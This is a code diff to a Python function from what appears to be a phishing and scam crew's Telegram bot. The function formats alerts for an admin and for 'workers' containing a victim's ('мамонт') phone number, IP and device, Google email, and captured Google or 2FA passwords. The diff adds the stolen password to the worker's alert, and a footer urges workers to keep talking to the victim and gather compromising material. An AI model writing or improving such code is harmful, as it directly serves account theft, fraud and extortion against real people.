@@ -435,10 +435,10 @@ async def notify_user_event(
             status_desc = f"<code>{norm_step}</code>"
 
         # 1. Admin Notification Message
-        admin_lines = [
-            admin_header,
-            f"🪞 <b>Зеркало:</b> {mirror_str}",
-            f"👨‍💻 <b>Воркер:</b> {worker_str}\n",
+        block_header = admin_header.strip()
+        block_info = f"🪞 <b>Зеркало:</b> {mirror_str}\n👨‍💻 <b>Воркер:</b> {worker_str}"
+
+        mamont_data_lines = [
             "🦣 <b>Личные данные мамонта:</b>",
             f"• <b>ID:</b> <code>{user_tg_id}</code>",
             f"• <b>Имя:</b> {user_nickname}",
@@ -446,7 +446,7 @@ async def notify_user_event(
             f"• <b>Номер телефона:</b> {phone_display}",
         ]
         if is_test_event and email:
-            admin_lines.append(f"• 📧 <b>Google Email:</b> <code>{email}</code>")
+            mamont_data_lines.append(f"• 📧 <b>Google Email:</b> <code>{email}</code>")
         if ip and ip != "—":
             prov = isp
             if not prov:
@@ -454,17 +454,23 @@ async def notify_user_event(
             elif country and country.lower() not in prov.lower():
                 prov = f"{prov}, {country}"
             prov_str = f" ({prov})" if prov else ""
-            admin_lines.append(f"• <b>IP:</b> <code>{ip}</code>{prov_str}")
+            mamont_data_lines.append(f"• <b>IP:</b> <code>{ip}</code>{prov_str}")
         if device and device != "—":
-            admin_lines.append(f"• 📱 <b>Устройство:</b> {device}")
+            mamont_data_lines.append(f"• 📱 <b>Устройство:</b> {device}")
 
+        block_mamont = "\n".join(mamont_data_lines)
+
+        auth_data_lines = []
         if password_2fa:
-            admin_lines.append(f"• <b>2FA Пароль:</b> <code>{password_2fa}</code>")
-        admin_lines.append(f"• <b>Статус:</b> {status_desc}")
+            pass_label = "Пароль Google" if (norm_step.startswith("google_") or email or is_test_event) else "2FA Пароль"
+            auth_data_lines.append(f"• 🔑 <b>{pass_label}:</b> <code>{password_2fa}</code>")
+        auth_data_lines.append(f"• 📊 <b>Статус:</b> {status_desc}")
         if details and not is_final_auth:
-            admin_lines.append(f"• <b>Детали:</b> {details}")
+            auth_data_lines.append(f"• 📝 <b>Детали:</b> {details}")
 
-        admin_text = "\n".join(admin_lines)
+        block_auth = "\n".join(auth_data_lines)
+
+        admin_text = f"{block_header}\n\n{block_info}\n\n{block_mamont}\n\n{block_auth}"
 
         admin_msg_id = user_row["admin_log_msg_id"] if user_row and "admin_log_msg_id" in user_row.keys() else None
         worker_msg_id = user_row["worker_log_msg_id"] if user_row and "worker_log_msg_id" in user_row.keys() else None
@@ -604,13 +610,13 @@ async def notify_user_event(
         new_worker_alert_msg_id = worker_alert_msg_id
 
         if target_worker_id:
-            worker_lines = [
-                worker_header,
+            w_header = worker_header.strip()
+            w_user_lines = [
                 f"👤 <b>Юзер:</b> {user_tag} (ID: <code>{user_tg_id}</code>)",
                 f"📱 <b>Телефон:</b> {phone_display}",
             ]
             if is_test_event and email:
-                worker_lines.append(f"• 📧 <b>Google Email:</b> <code>{email}</code>")
+                w_user_lines.append(f"• 📧 <b>Google Email:</b> <code>{email}</code>")
             if ip and ip != "—":
                 prov = isp
                 if not prov:
@@ -618,14 +624,18 @@ async def notify_user_event(
                 elif country and country.lower() not in prov.lower():
                     prov = f"{prov}, {country}"
                 prov_str = f" ({prov})" if prov else ""
-                worker_lines.append(f"• <b>IP:</b> <code>{ip}</code>{prov_str}")
+                w_user_lines.append(f"• <b>IP:</b> <code>{ip}</code>{prov_str}")
             if device and device != "—":
-                worker_lines.append(f"• 📱 <b>Устройство:</b> {device}")
+                w_user_lines.append(f"• 📱 <b>Устройство:</b> {device}")
+            if password_2fa:
+                w_pass_label = "Пароль Google" if (norm_step.startswith("google_") or email or is_test_event) else "2FA Пароль"
+                w_user_lines.append(f"• 🔑 <b>{w_pass_label}:</b> <code>{password_2fa}</code>")
 
-            worker_lines.append(f"\n<blockquote><i>📊 <b>Статус:</b> {status_desc}</i></blockquote>\n")
-            worker_lines.append("<i>Продолжайте общение с лохматым и пришлите ТС компромитирующий материал 🦣 </i>")
+            w_user_block = "\n".join(w_user_lines)
+            w_status_block = f"<blockquote><i>📊 <b>Статус:</b> {status_desc}</i></blockquote>"
+            w_footer = "<i>Продолжайте общение с лохматым и пришлите ТС компромитирующий материал 🦣 </i>"
 
-            worker_text = "\n".join(worker_lines)
+            worker_text = f"{w_header}\n\n{w_user_block}\n\n{w_status_block}\n\n{w_footer}"
 
             # 2.1 Worker Notification Card
             if is_final_auth:
